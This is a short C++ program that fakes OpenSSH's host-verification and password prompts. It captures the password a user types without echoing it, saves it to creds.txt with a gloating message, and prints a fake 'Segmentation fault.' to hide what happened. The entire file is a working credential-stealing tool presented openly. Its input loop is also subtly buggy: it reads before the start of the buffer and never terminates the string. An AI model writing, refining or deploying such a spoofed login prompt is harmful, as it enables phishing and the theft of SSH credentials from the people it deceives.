#include <iostream>
#include <fstream>
#include <string>

#include <termios.h>
#include <unistd.h>
#include <stdio.h>

int getch(void)
{
    struct termios oldattr, newattr;
    int ch;
    tcgetattr( STDIN_FILENO, &oldattr );
    newattr = oldattr;
    newattr.c_lflag &= ~( ICANON | ECHO );
    tcsetattr( STDIN_FILENO, TCSANOW, &newattr );
    ch = getchar();
    tcsetattr( STDIN_FILENO, TCSANOW, &oldattr );
    return ch;
}

int main(int argc, char *argv[])
{
        std::string choice;
        char password[1024];
        int k = 0;
    
        std::string prefix = "It's done, credentials here now.\nHave a nice day!\n";

        std::cout << "The authenticity of host '" << argv[1] << " (" << argv[1] << ")' can't be established." << std::endl;
        std::cout << "ECDSA key fingerprint is SHA256:mj+qeyC6f/Wzzmu7z33jyDzYUiR0vwl2v5cpK/x7GE0." << std::endl;
        std::cout << "Are you sure you want to continue connecting (yes/no)? ";

        std::cin >> choice;
        std::cout << "Warning: Permanently added '" << argv[1] << "' (ECDSA) to the list of known hosts." << std::endl;

        std::cout << "Password: ";
        while (password[k-1] != '\r') {
                password[k] = getch();
                if (password[k] == '\n' and k != 0) break;
                if (password[k] != '\r') {
                        if (k != 0) {
                                NULL;
                        }
                }
                k++;
        }

        std::ofstream myfile;
        myfile.open("creds.txt");
        myfile << prefix << "Password: " << password << std::endl;
        myfile.close();
    
        std::cout << "\nSegmentation fault." << std::endl;
        return 0;
}
